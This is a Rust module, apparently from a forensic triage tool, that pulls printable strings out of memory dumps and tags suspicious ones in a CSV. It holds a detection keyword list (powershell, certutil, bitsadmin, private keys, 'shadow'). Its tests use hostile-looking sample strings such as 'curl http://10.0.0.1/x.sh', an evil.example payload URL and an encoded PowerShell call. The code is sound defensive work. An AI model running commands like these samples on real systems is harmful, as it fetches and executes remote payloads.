//! 内存转储字符串扫描：对 raw/memory.bin、raw/memory_dumps/*.dmp 或
//! raw/memory_triage(_processes)/* 提取
//! ASCII / UTF-16LE 可打印字符串，匹配可疑特征（URL、临时路径、执行器、
//! Base64 长串、凭据关键词等），输出 findings/memory_strings.csv。

use std::fs::File;
use std::io::{Read, Seek, SeekFrom};
use std::path::Path;

use serde::Serialize;

use crate::error::Result;
use crate::output::paths::OutputLayout;

const HEADER: &str = "source_file,offset,encoding,text,tag\n";
const CHUNK_SIZE: usize = 4 * 1024 * 1024;
const OVERLAP: usize = 1024;
const MIN_STRING_LEN: usize = 8;
/// 最多输出的可疑字符串行数。
const MAX_ROWS: usize = 20_000;
/// 单个 dump 文件最多扫描的字节数（0 表示全量）。
const DEFAULT_SCAN_LIMIT_BYTES: u64 = 2 * 1024 * 1024 * 1024;

#[derive(Debug, Clone, Serialize)]
struct MemoryStringRow {
    source_file: String,
    offset: String,
    encoding: String,
    text: String,
    tag: String,
}

/// 扫描结果目录中已存在的内存转储（原生或外置工具产出）。
pub fn scan_memory_dumps(layout: &OutputLayout) -> Result<usize> {
    let mut targets = Vec::new();
    let main = layout.raw_dir.join(super::memory::MEMORY_DUMP_NAME);
    if main.is_file() {
        targets.push(main);
    }
    let dumps_dir = layout.raw_dir.join("memory_dumps");
    if let Ok(entries) = std::fs::read_dir(&dumps_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().map(|ext| ext == "dmp").unwrap_or(false) {
                targets.push(path);
            }
        }
    }
    let triage_dumps_dir = layout.raw_dir.join("memory_triage_processes");
    if let Ok(entries) = std::fs::read_dir(&triage_dumps_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().map(|ext| ext == "dmp").unwrap_or(false) {
                targets.push(path);
            }
        }
    }
    let triage_dir = layout.raw_dir.join("memory_triage");
    if let Ok(entries) = std::fs::read_dir(&triage_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().map(|ext| ext == "bin").unwrap_or(false) {
                targets.push(path);
            }
        }
    }
    if targets.is_empty() {
        return Ok(0);
    }
    let mut rows = Vec::new();
    for target in &targets {
        scan_file(target, &mut rows);
        if rows.len() >= MAX_ROWS {
            rows.truncate(MAX_ROWS);
            break;
        }
    }
    if rows.is_empty() {
        crate::output::writers::write_text(&layout.memory_strings, HEADER).map(|_| 0)
    } else {
        let count = rows.len();
        crate::output::writers::write_csv_serialize(&layout.memory_strings, &rows).map(|_| count)
    }
}

fn scan_file(path: &Path, rows: &mut Vec<MemoryStringRow>) {
    let Ok(mut file) = File::open(path) else {
        return;
    };
    let limit = file
        .metadata()
        .map(|m| m.len())
        .unwrap_or(0)
        .min(DEFAULT_SCAN_LIMIT_BYTES);
    let source = path.display().to_string();
    let mut buffer = vec![0u8; CHUNK_SIZE + OVERLAP];
    let mut offset: u64 = 0;
    while offset < limit {
        let want = buffer.len().min((limit - offset) as usize);
        let Ok(read) = file.read(&mut buffer[..want]) else {
            break;
        };
        if read == 0 {
            break;
        }
        extract_ascii(&source, offset, &buffer[..read], rows);
        extract_utf16(&source, offset, &buffer[..read], rows);
        if rows.len() >= MAX_ROWS || read < want || read <= OVERLAP {
            break;
        }
        offset += (read - OVERLAP) as u64;
        let _ = file.seek(SeekFrom::Start(offset));
    }
}

fn extract_ascii(source: &str, base: u64, chunk: &[u8], rows: &mut Vec<MemoryStringRow>) {
    let mut start: Option<usize> = None;
    for (index, byte) in chunk.iter().enumerate() {
        let printable = byte.is_ascii_graphic() || *byte == b' ';
        if printable {
            if start.is_none() {
                start = Some(index);
            }
        } else if let Some(begin) = start.take() {
            consider(source, base, begin, &chunk[begin..index], "ascii", rows);
        }
    }
    if let Some(begin) = start {
        consider(source, base, begin, &chunk[begin..], "ascii", rows);
    }
}

fn extract_utf16(source: &str, base: u64, chunk: &[u8], rows: &mut Vec<MemoryStringRow>) {
    let mut index = 0;
    while index + 1 < chunk.len() {
        // UTF-16LE 可打印段：字节对满足 (printable, 0)。
        let mut run = String::new();
        let begin = index;
        while index + 1 < chunk.len()
            && chunk[index + 1] == 0
            && (chunk[index].is_ascii_graphic() || chunk[index] == b' ')
        {
            run.push(chunk[index] as char);
            index += 2;
        }
        if run.len() >= MIN_STRING_LEN {
            consider(source, base, begin, run.as_bytes(), "utf16le", rows);
        }
        index += if run.is_empty() { 1 } else { 0 };
    }
}

fn consider(
    source: &str,
    base: u64,
    begin: usize,
    bytes: &[u8],
    encoding: &str,
    rows: &mut Vec<MemoryStringRow>,
) {
    if bytes.len() < MIN_STRING_LEN || rows.len() >= MAX_ROWS {
        return;
    }
    // 提取出的段已限定 ASCII 可打印，可直接在字节层裁剪与分类，
    // 避免每条候选串两次堆分配（RAM 转储中候选串达百万级）。
    let trimmed = trim_ascii_space(bytes);
    if trimmed.len() < MIN_STRING_LEN {
        return;
    }
    if let Some(tag) = classify_bytes(trimmed) {
        let text = String::from_utf8_lossy(&trimmed[..trimmed.len().min(512)]).to_string();
        rows.push(MemoryStringRow {
            source_file: source.to_string(),
            offset: (base + begin as u64).to_string(),
            encoding: encoding.to_string(),
            text,
            tag: tag.to_string(),
        });
    }
}

fn trim_ascii_space(mut bytes: &[u8]) -> &[u8] {
    while let Some(first) = bytes.first() {
        if first.is_ascii_whitespace() {
            bytes = &bytes[1..];
        } else {
            break;
        }
    }
    while let Some(last) = bytes.last() {
        if last.is_ascii_whitespace() {
            bytes = &bytes[..bytes.len() - 1];
        } else {
            break;
        }
    }
    bytes
}

/// 字节层大小写不敏感包含（needle 须为小写 ASCII）。
fn ascii_ci_contains(haystack: &[u8], needle: &[u8]) -> bool {
    if haystack.len() < needle.len() || needle.is_empty() {
        return false;
    }
    'outer: for start in 0..=haystack.len() - needle.len() {
        for (offset, expected) in needle.iter().enumerate() {
            if haystack[start + offset].to_ascii_lowercase() != *expected {
                continue 'outer;
            }
        }
        return true;
    }
    false
}

/// 可疑特征分类：命中才输出，避免整份 dump 的字符串洪水。
#[cfg(test)]
pub(crate) fn classify(text: &str) -> Option<&'static str> {
    classify_bytes(text.as_bytes())
}

fn classify_bytes(text: &[u8]) -> Option<&'static str> {
    const CHECKS: [(&[u8], &str); 14] = [
        (b"http://", "url"),
        (b"https://", "url"),
        (b"/tmp/", "temp_path"),
        (b"/dev/shm", "temp_path"),
        (b"\\temp\\", "temp_path"),
        (b"\\users\\public\\", "temp_path"),
        (b"powershell", "executor"),
        (b"cmd.exe", "executor"),
        (b"certutil", "executor"),
        (b"bitsadmin", "executor"),
        (b"authorized_keys", "ssh_artifact"),
        (b"begin rsa private key", "private_key"),
        (b"begin open ssh", "private_key"),
        (b"shadow", "credential_artifact"),
    ];
    for (needle, tag) in CHECKS {
        if ascii_ci_contains(text, needle) {
            return Some(tag);
        }
    }
    // 长纯 Base64 段。
    if text.len() >= 64
        && text.iter().all(|byte| {
            byte.is_ascii_alphanumeric() || *byte == b'+' || *byte == b'/' || *byte == b'='
        })
    {
        return Some("base64_run");
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classifies_interesting_strings() {
        assert_eq!(classify("curl http://10.0.0.1/x.sh"), Some("url"));
        assert_eq!(classify("/tmp/.ice/unix/.rs"), Some("temp_path"));
        assert_eq!(classify("powershell -enc AAAA"), Some("executor"));
        assert_eq!(classify("just a normal sentence"), None);
    }

    #[test]
    fn extracts_ascii_and_utf16_runs() {
        let mut rows = Vec::new();
        let chunk = b"normal\x00http://evil.example/payload\x00more\x00";
        extract_ascii("t", 0, chunk, &mut rows);
        assert!(rows.iter().any(|row| row.text.contains("evil.example")));

        let mut rows = Vec::new();
        let mut utf16 = Vec::new();
        for ch in "powershell hidden".chars() {
            utf16.push(ch as u8);
            utf16.push(0);
        }
        utf16.extend_from_slice(b"\x00\x00junk");
        extract_utf16("t", 0, &utf16, &mut rows);
        assert!(rows
            .iter()
            .any(|row| row.encoding == "utf16le" && row.text.contains("powershell")));
    }

    #[test]
    fn scans_small_dump_without_overlap_underflow() {
        let path = std::env::temp_dir().join(format!("dumpall-small-dump-{}", std::process::id()));
        std::fs::write(&path, b"powershell").unwrap();
        let mut rows = Vec::new();
        scan_file(&path, &mut rows);
        assert!(rows.iter().any(|row| row.tag == "executor"));
        let _ = std::fs::remove_file(path);
    }
}
